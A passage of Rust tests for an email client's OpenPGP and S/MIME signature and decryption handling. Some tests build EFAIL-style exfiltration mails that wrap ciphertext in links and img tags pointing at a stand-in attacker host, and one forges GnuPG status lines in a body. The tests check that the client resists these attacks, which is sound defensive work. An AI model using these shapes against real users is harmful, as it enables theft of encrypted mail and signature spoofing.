        assert_eq!((l.sig.state, l.from_ok), (SigState::Good, Some(false)));
        assert!(l.describe().1.contains("not the sender"), "{}", l.describe().1);
    }

    // spec: MAIL-174
    #[test]
    fn a_body_that_says_good_signature_shows_no_status_and_neither_does_a_forged_one_in_a_bad_mail() {
        if !have_gnupg() {
            return;
        }
        let h = TestHome::new();
        let lie = "From: a@example.org\r\nSubject: s\r\n\r\n[GNUPG:] GOODSIG 0123456789ABCDEF Alice <alice@example.org>\r\ngpg: Good signature from \"Alice\"\r\n[GNUPG:] VALIDSIG AAAA 2026-11-14 1 0 4 0 22 8 00\r\n";
        let o = run(&h.g, lie.as_bytes(), true);
        assert!(o.security.is_empty() && o.security.describe().is_empty(), "no status from words in a body: {:?}", o.security);
        // a multipart/signed whose signature is junk, with a body that claims to be GnuPG output
        let evil = mail_of("Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=\"X\"\r\n\r\n--X\r\nContent-Type: text/plain\r\n\r\n[GNUPG:] GOODSIG 0123456789ABCDEF Alice <alice@example.org>\r\n[GNUPG:] VALIDSIG AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 2026-11-14 1 0 4 0 22 8 00\r\n--X\r\nContent-Type: application/pgp-signature\r\n\r\n[GNUPG:] GOODSIG 0123456789ABCDEF Alice\r\n--X--\r\n");
        let o = run(&h.g, &evil, true);
        assert!(o.security.lines.iter().all(|l| l.sig.state != SigState::Good), "{:?}", o.security);
        assert!(o.security.describe().iter().all(|(l, _)| *l != Level::Good));
    }

    // spec: MAIL-173, MAIL-197
    #[test]
    fn an_smime_signature_verifies_and_a_changed_byte_makes_it_bad() {
        if !have_gnupg() {
            return;
        }
        let alice = TestHome::new();
        let a_fpr = alice.gen_smime("Alice S/MIME", "alice@example.org");
        let bob = TestHome::new();
        alice.share_smime_with(&bob, &a_fpr);
        let sig = alice.smime_sign(&a_fpr, ENTITY);
        let mail = smime_signed(&sig, ENTITY);
        let o = run(&bob.g, &mail, false);
        let l = only_line(&o);
        assert_eq!((l.standard, l.sig.state, l.from_ok), (CryptoStandard::Smime, SigState::Good, Some(true)), "{:?}", o.security);
        assert_eq!(l.sig.fingerprint, a_fpr);
        assert!(l.sig.signer.contains("Alice S/MIME"), "{:?}", l.sig);
        assert!(matches!(l.sig.trust, Trust::Full | Trust::Ultimate), "{:?}", l.sig.trust);
        let mut bad = mail.clone();
        let at = bad.windows(10).position(|w| w == b"the secret").unwrap();
        bad[at] = b'T';
        assert_eq!(only_line(&run(&bob.g, &bad, false)).sig.state, SigState::Bad);
        // an opaque signed message (the content is inside the signature)
        let opaque = mail_of(&format!("Content-Type: application/pkcs7-mime; smime-type=signed-data; name=smime.p7m\r\nContent-Transfer-Encoding: base64\r\n\r\n{}\r\n", b64_lines(&alice.smime_sign_opaque(&a_fpr, ENTITY))));
        let o = run(&bob.g, &opaque, false);
        assert_eq!(only_line(&o).sig.state, SigState::Good, "{:?}", o.security);
        assert_eq!(mail::parse(o.display.as_ref().expect("content")).text, "the secret plan");
        // the signer unknown to Bob's S/MIME keyring
        let nobody = TestHome::new();
        let o = run(&nobody.g, &mail, false);
        assert_eq!((only_line(&o).sig.state, only_line(&o).describe().0), (SigState::UnknownKey, Level::Warn), "{:?}", o.security);
    }

    // spec: MAIL-181, MAIL-177
    #[test]
    fn without_consent_nothing_is_decrypted_and_gnupg_is_not_even_called_for_it() {
        // a gpg that cannot run: if anything tried to call it, the answer would be "not installed"
        let g = Gnupg { gpg: "/nonexistent/gpg".into(), gpgsm: "/nonexistent/gpgsm".into(), home: None };
        let enc = pgp_encrypted(b"-----BEGIN PGP MESSAGE-----\r\n\r\nxx\r\n-----END PGP MESSAGE-----");
        let o = run(&g, &enc, false);
        assert_eq!(o.security.encryption, Encryption::NeedsConsent);
        assert!(o.security.unavailable.is_none() && o.display.is_none() && !o.decrypted);
        assert_eq!(o.security.describe()[0].1, "Encrypted — enable encryption in the settings");
        let sm = smime_enveloped(&[1, 2, 3]);
        assert_eq!(run(&g, &sm, false).security.encryption, Encryption::NeedsConsent);
        // with consent and no gpg: reported in words, mail untouched
        let o = run(&g, &enc, true);
        assert!(matches!(o.security.encryption, Encryption::Failed(ref t) if t.contains("not installed")), "{:?}", o.security);
        assert!(!o.decrypted);
    }

    // spec: MAIL-182, MAIL-197
    #[test]
    fn with_consent_a_pgp_mime_mail_is_decrypted_as_its_own_message_and_a_wrong_key_is_told() {
        if !have_gnupg() {
            return;
        }
        let alice = TestHome::new();
        alice.gen_pgp("Alice Test", "alice@example.org", "never", None);
        let bob = TestHome::new();
        let b_fpr = bob.gen_pgp("Bob", "bob@example.org", "never", None);
        bob.share_pgp_with(&alice, &b_fpr);
        let mail = pgp_encrypted(&alice.pgp_encrypt(&[&b_fpr], None, ENTITY));
        let o = run(&bob.g, &mail, true);
        assert_eq!(o.security.encryption, Encryption::Decrypted(CryptoStandard::OpenPgp), "{:?}", o.security);
        assert!(o.decrypted);
        let shown = mail::parse(o.display.as_ref().unwrap());
        assert_eq!((shown.text.as_str(), shown.subject.as_str(), shown.from.as_str()), ("the secret plan", "Plans", "Alice Test <alice@example.org>"));
        assert!(shown.attachments.is_empty(), "no ciphertext attachments in the decrypted view");
        // Alice is not a recipient: no secret key fits
        let o = run(&alice.g, &mail, true);
        assert!(matches!(o.security.encryption, Encryption::Failed(ref t) if t.contains("not in your keyring")), "{:?}", o.security);
        assert!(!o.decrypted && o.display.is_none());
        // a corrupted message
        let junk = pgp_encrypted(b"-----BEGIN PGP MESSAGE-----\r\n\r\nAAAA\r\n-----END PGP MESSAGE-----");
        let o = run(&bob.g, &junk, true);
        assert!(matches!(o.security.encryption, Encryption::Failed(_)), "{:?}", o.security);
    }

    // spec: MAIL-176, MAIL-197
    #[test]
    fn signed_and_encrypted_mail_is_understood_in_all_three_arrangements() {
        if !have_gnupg() {
            return;
        }
        let alice = TestHome::new();
        let a_fpr = alice.gen_pgp("Alice Test", "alice@example.org", "never", None);
        let bob = TestHome::new();
        let b_fpr = bob.gen_pgp("Bob", "bob@example.org", "never", None);
        bob.share_pgp_with(&alice, &b_fpr);
        alice.share_pgp_with(&bob, &a_fpr);
        // 1. one OpenPGP message that is signed and encrypted together
        let combined = pgp_encrypted(&alice.pgp_encrypt(&[&b_fpr], Some(&a_fpr), ENTITY));
        let o = run(&bob.g, &combined, true);
        assert_eq!(o.security.encryption, Encryption::Decrypted(CryptoStandard::OpenPgp));
        assert_eq!(only_line(&o).sig.state, SigState::Good, "{:?}", o.security);
        assert_eq!(mail::parse(o.display.as_ref().unwrap()).text, "the secret plan");
        // 2. sign-then-encrypt: a multipart/signed entity inside the encryption
        let inner = {
            let signed = pgp_signed(&alice, &a_fpr, ENTITY);
            let e = split_raw(&signed);
            // the entity of the signed mail: its Content-Type header and the body
            let mut v = format!("Content-Type: {}\r\n\r\n", e.value("content-type").unwrap()).into_bytes();
            v.extend_from_slice(e.body);
            v
        };
        let o = run(&bob.g, &pgp_encrypted(&alice.pgp_encrypt(&[&b_fpr], None, &inner)), true);
        assert_eq!(o.security.encryption, Encryption::Decrypted(CryptoStandard::OpenPgp));
        assert_eq!(only_line(&o).sig.state, SigState::Good, "{:?}", o.security);
        assert_eq!(mail::parse(o.display.as_ref().unwrap()).text, "the secret plan");
        // 3. encrypt-then-sign: an outer multipart/signed whose content is the encrypted entity
        let enc_entity = {
            let m = pgp_encrypted(&alice.pgp_encrypt(&[&b_fpr], None, ENTITY));
            let e = split_raw(&m);
            let mut v = format!("Content-Type: {}\r\n\r\n", e.value("content-type").unwrap()).into_bytes();
            v.extend_from_slice(e.body);
            v
        };
        let o = run(&bob.g, &pgp_signed(&alice, &a_fpr, &enc_entity), true);
        assert_eq!(o.security.encryption, Encryption::Decrypted(CryptoStandard::OpenPgp), "{:?}", o.security);
        assert_eq!(only_line(&o).sig.state, SigState::Good, "{:?}", o.security);
        assert_eq!(mail::parse(o.display.as_ref().unwrap()).text, "the secret plan");
        // the same without consent: the outer signature is checked, the inner part is not decrypted
        let o = run(&bob.g, &pgp_signed(&alice, &a_fpr, &enc_entity), false);
        assert_eq!(o.security.encryption, Encryption::NeedsConsent);
        assert_eq!(only_line(&o).sig.state, SigState::Good);
    }

    // spec: MAIL-177
    #[test]
    fn an_encrypted_part_wrapped_in_attacker_text_is_not_decrypted_and_nothing_is_joined() {
        if !have_gnupg() {
            return;
        }
        let alice = TestHome::new();
        alice.gen_pgp("Alice Test", "alice@example.org", "never", None);
        let bob = TestHome::new();
        let b_fpr = bob.gen_pgp("Bob", "bob@example.org", "never", None);
        bob.share_pgp_with(&alice, &b_fpr);
        let armored = String::from_utf8(alice.pgp_encrypt(&[&b_fpr], None, ENTITY)).unwrap().replace('\n', "\r\n");
        // the classic EFAIL shape: attacker text opens a link, the ciphertext is the next part, attacker text closes it
        let mixed = mail_of(&format!(
            "Content-Type: multipart/mixed; boundary=\"M\"\r\n\r\n--M\r\nContent-Type: text/plain\r\n\r\nsee http://evil.example/steal?q=\r\n--M\r\nContent-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"E\"\r\n\r\n--E\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--E\r\nContent-Type: application/octet-stream\r\n\r\n{armored}\r\n--E--\r\n--M\r\nContent-Type: text/plain\r\n\r\nend of link\r\n--M--\r\n"
        ));
        let o = run(&bob.g, &mixed, true);
        assert!(matches!(o.security.encryption, Encryption::NotDecrypted(_)), "{:?}", o.security);
        assert!(!o.decrypted && o.display.is_none(), "nothing decrypted, nothing synthesised");
        let shown = mail::parse(&mixed);
        assert!(!shown.text.contains("secret plan") && !shown.attachments.iter().any(|a| String::from_utf8_lossy(&a.data).contains("secret plan")));
        // inline: ciphertext with text around it
        let around = mail_of(&format!("Content-Type: text/plain\r\n\r\nopen http://evil.example/?x=\r\n{armored}\r\nclose\r\n"));
        let o = run(&bob.g, &around, true);
        assert!(!o.decrypted && o.display.is_none(), "{:?}", o.security);
        // a whole-message inline block is decrypted, as its own message
        let inline = mail_of(&format!("Content-Type: text/plain\r\n\r\n{armored}\r\n"));
        let o = run(&bob.g, &inline, true);
        assert!(o.decrypted, "{:?}", o.security);
        assert!(mail::parse(o.display.as_ref().unwrap()).text.contains("the secret plan"));
        assert!(o.security.notes.iter().any(|n| n.contains("weaker")));
    }

    // spec: MAIL-175
    #[test]
    fn inline_openpgp_signatures_are_checked_but_called_weaker() {
        if !have_gnupg() {
            return;
        }
        let alice = TestHome::new();
        let a_fpr = alice.gen_pgp("Alice Test", "alice@example.org", "never", None);
        let signed = String::from_utf8(alice.pgp_clearsign(&a_fpr, "plain words\n")).unwrap().replace('\n', "\r\n");
        let m = mail_of(&format!("Content-Type: text/plain\r\n\r\n{signed}\r\nunsigned addition\r\n"));
        let o = run(&alice.g, &m, false);
        let l = only_line(&o);
        assert_eq!((l.sig.state, l.scope), (SigState::Good, Scope::Inline));
        assert_eq!(l.describe().0, Level::Warn, "inline is never green");
        assert!(l.describe().1.contains("weaker"));
        assert!(o.security.notes.iter().any(|n| n.contains("outside the signed block")), "{:?}", o.security.notes);
    }

    // spec: MAIL-182, MAIL-197
    #[test]
    fn smime_enveloped_mail_is_decrypted_with_consent_and_for_the_right_recipient_only() {
        if !have_gnupg() {
            return;
        }
        let alice = TestHome::new();
        let a_fpr = alice.gen_smime("Alice S/MIME", "alice@example.org");
        let bob = TestHome::new();
        let b_fpr = bob.gen_smime("Bob S/MIME", "bob@example.org");
        bob.share_smime_with(&alice, &b_fpr);
        let mail = smime_enveloped(&alice.smime_encrypt(&[&b_fpr], ENTITY));
        let o = run(&bob.g, &mail, true);
        assert_eq!(o.security.encryption, Encryption::Decrypted(CryptoStandard::Smime), "{:?}", o.security);
        assert_eq!(mail::parse(o.display.as_ref().unwrap()).text, "the secret plan");
        let o = run(&alice.g, &mail, true);
        assert!(matches!(o.security.encryption, Encryption::Failed(_)), "{:?}", o.security);
        let _ = a_fpr;
    }

    // spec: MAIL-172
    #[test]
    fn the_top_level_structure_is_recognised_for_pgp_mime_and_smime() {
        match classify(&signed_mail("application/pgp-signature", "application/pgp-signature", "SIGDATA")) {
            Structure::Signed { standard, signed, signature, scope } => {
                assert_eq!((standard, scope), (CryptoStandard::OpenPgp, Scope::Whole));
                assert_eq!(signed, b"Content-Type: text/plain\r\n\r\nhello", "the exact part, without the line break before the boundary");
                assert_eq!(signature, b"SIGDATA");
            }
            other => panic!("{other:?}"),
        }
        let sm = classify(&signed_mail("application/pkcs7-signature", "application/pkcs7-signature\r\nContent-Transfer-Encoding: base64", "U0lHREFUQQ=="));
        assert!(matches!(&sm, Structure::Signed { standard: CryptoStandard::Smime, signature, .. } if signature == b"SIGDATA"), "{sm:?}");
        let enc = b"From: a@x\r\nContent-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"E\"\r\n\r\n--E\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--E\r\nContent-Type: application/octet-stream\r\n\r\n-----BEGIN PGP MESSAGE-----\r\nxx\r\n-----END PGP MESSAGE-----\r\n--E--\r\n";
        assert!(matches!(classify(enc), Structure::Encrypted { standard: CryptoStandard::OpenPgp, .. }));
        let env = b"From: a@x\r\nContent-Type: application/pkcs7-mime; smime-type=enveloped-data; name=smime.p7m\r\nContent-Transfer-Encoding: base64\r\n\r\nAAEC\r\n";
        assert!(matches!(classify(env), Structure::Encrypted { standard: CryptoStandard::Smime, data } if data == [0, 1, 2]));
        let opaque = b"From: a@x\r\nContent-Type: application/pkcs7-mime; smime-type=signed-data; name=smime.p7m\r\nContent-Transfer-Encoding: base64\r\n\r\nAAEC\r\n";
        assert!(matches!(classify(opaque), Structure::OpaqueSigned { .. }));
        assert_eq!(classify(b"From: a@x\r\nSubject: hi\r\n\r\njust text\r\n"), Structure::Plain);
        assert_eq!(classify(b"\x00\xff garbage"), Structure::Plain);
        // a signed mail with the wrong number of parts is not trusted
        let bad = b"Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=B\r\n\r\n--B\r\n\r\nx\r\n--B--\r\n";
        assert!(matches!(classify(bad), Structure::Mixed { .. }));
    }

    // spec: MAIL-172, MAIL-175
    #[test]
    fn inline_openpgp_is_recognised_and_a_block_with_text_around_it_is_not_taken_for_a_whole_message() {
        let signed = b"Subject: s\r\n\r\nhi\r\n-----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA256\r\n\r\ntext\r\n-----BEGIN PGP SIGNATURE-----\r\n\r\nabc\r\n-----END PGP SIGNATURE-----\r\n";
        assert!(matches!(classify(signed), Structure::InlineSigned { outside_text: true, .. }));
        let whole = b"Subject: s\r\n\r\n-----BEGIN PGP MESSAGE-----\r\n\r\nabc\r\n-----END PGP MESSAGE-----\r\n";
        assert!(matches!(classify(whole), Structure::InlineEncrypted { .. }));
        let around = b"Subject: s\r\n\r\nplease read this: http://evil.example/?x=\r\n-----BEGIN PGP MESSAGE-----\r\n\r\nabc\r\n-----END PGP MESSAGE-----\r\n\">\r\n";
        assert!(matches!(classify(around), Structure::Mixed { .. }), "text around an encrypted block: never decrypted");
    }

    // spec: MAIL-172, MAIL-177
    #[test]
    fn an_encrypted_part_next_to_other_parts_is_never_a_candidate_for_decryption() {
        let mixed = b"From: m@evil.example\r\nContent-Type: multipart/mixed; boundary=\"M\"\r\n\r\n--M\r\nContent-Type: text/plain\r\n\r\n<img src=\"http://evil.example/?\r\n--M\r\nContent-Type: multipart/encrypted; protocol=\"application/pgp-encrypted\"; boundary=\"E\"\r\n\r\n--E\r\nContent-Type: application/pgp-encrypted\r\n\r\nVersion: 1\r\n--E\r\nContent-Type: application/octet-stream\r\n\r\n-----BEGIN PGP MESSAGE-----\r\nxx\r\n-----END PGP MESSAGE-----\r\n--E--\r\n--M\r\nContent-Type: text/plain\r\n\r\n\">\r\n--M--\r\n";
        match classify(mixed) {
            Structure::Mixed { why } => assert!(why.contains("mixes encrypted and unencrypted"), "{why}"),
            other => panic!("{other:?}"),
        }
        // a signed part inside a mixed mail is only a part
        let part = b"Content-Type: multipart/mixed; boundary=\"M\"\r\n\r\n--M\r\nContent-Type: text/plain\r\n\r\nunsigned\r\n--M\r\nContent-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=\"S\"\r\n\r\n--S\r\nContent-Type: text/plain\r\n\r\nsigned\r\n--S\r\nContent-Type: application/pgp-signature\r\n\r\nSIG\r\n--S--\r\n--M--\r\n";
        assert!(matches!(classify(part), Structure::Signed { scope: Scope::Part, .. }));
    }

    // spec: MAIL-173
    #[test]
    fn the_signed_bytes_are_made_canonical_with_crlf_and_nothing_else() {
        assert_eq!(canonical_crlf(b"a\nb\r\nc\n\nd"), b"a\r\nb\r\nc\r\n\r\nd");
        assert_eq!(canonical_crlf(b"no break"), b"no break");
        // a message stored with bare line feeds still yields the CRLF form
        let lf = "Content-Type: multipart/signed; protocol=\"application/pgp-signature\"; boundary=B\n\n--B\nContent-Type: text/plain\n\nhello\n--B\nContent-Type: application/pgp-signature\n\nSIG\n--B--\n";
        match classify(lf.as_bytes()) {
            Structure::Signed { signed, .. } => assert_eq!(signed, b"Content-Type: text/plain\r\n\r\nhello"),
            other => panic!("{other:?}"),
        }
    }

    // spec: MAIL-177
    #[test]
    fn a_decrypted_entity_becomes_its_own_message_with_only_the_outer_headers() {
        let outer = b"From: a@x.org\r\nSubject: s\r\nContent-Type: multipart/encrypted; boundary=E\r\nMIME-Version: 1.0\r\nX-Other: 1\r\n  folded\r\n\r\nOUTER BODY SHOULD NOT SURVIVE";
        let inner = b"Content-Type: text/plain\r\n\r\nsecret\r\n";
        let m = synthesize(outer, inner);
        let text = String::from_utf8(m.clone()).unwrap();
        assert!(!text.contains("OUTER BODY") && !text.contains("multipart/encrypted"), "{text}");
        assert!(text.contains("From: a@x.org\r\nSubject: s\r\n") && text.contains("X-Other: 1\r\n  folded\r\n"));
        let parsed = mail::parse(&m);
        assert_eq!((parsed.subject.as_str(), parsed.text.as_str()), ("s", "secret"));
        assert_eq!(ensure_entity(b"just text"), b"Content-Type: text/plain; charset=utf-8\r\nContent-Transfer-Encoding: 8bit\r\n\r\njust text".to_vec());
    }

    // spec: MAIL-174
    #[test]
    fn the_strip_says_what_gnupg_said_with_a_colour_for_each_state() {
        let line = |state, trust, scope, from_ok| SigLine {
            standard: CryptoStandard::OpenPgp,
            sig: SigStatus { state, key_id: "AAAA".into(), fingerprint: "0123456789ABCDEF0123456789ABCDEF01234567".into(), signer: "Ada <ada@x.org>".into(), trust, time: None },
            scope,
            from_ok,
        };
        let (l, t) = line(SigState::Good, Trust::Full, Scope::Whole, Some(true)).describe();
        assert_eq!(l, Level::Good);
        assert!(t.contains("valid") && t.contains("Ada <ada@x.org>") && t.contains("4567"), "{t}");
        assert_eq!(line(SigState::Good, Trust::Undefined, Scope::Whole, None).describe().0, Level::Warn, "valid but not certified");
        assert_eq!(line(SigState::Bad, Trust::Unknown, Scope::Whole, None).describe().0, Level::Bad);
        assert_eq!(line(SigState::RevokedKey, Trust::Unknown, Scope::Whole, None).describe().0, Level::Bad);
        assert_eq!(line(SigState::ExpiredKey, Trust::Full, Scope::Whole, None).describe().0, Level::Warn);
        assert_eq!(line(SigState::UnknownKey, Trust::Unknown, Scope::Whole, None).describe().0, Level::Warn);
        let (l, t) = line(SigState::Good, Trust::Full, Scope::Whole, Some(false)).describe();
        assert!((l, t.contains("not the sender")) == (Level::Warn, true), "{t}");
        let (l, t) = line(SigState::Good, Trust::Full, Scope::Part, None).describe();
        assert!(l == Level::Warn && t.starts_with("Only a part"), "{t}");
        let (l, t) = line(SigState::Good, Trust::Full, Scope::Inline, None).describe();
        assert!(l == Level::Warn && t.contains("weaker"), "{t}");
    }
}
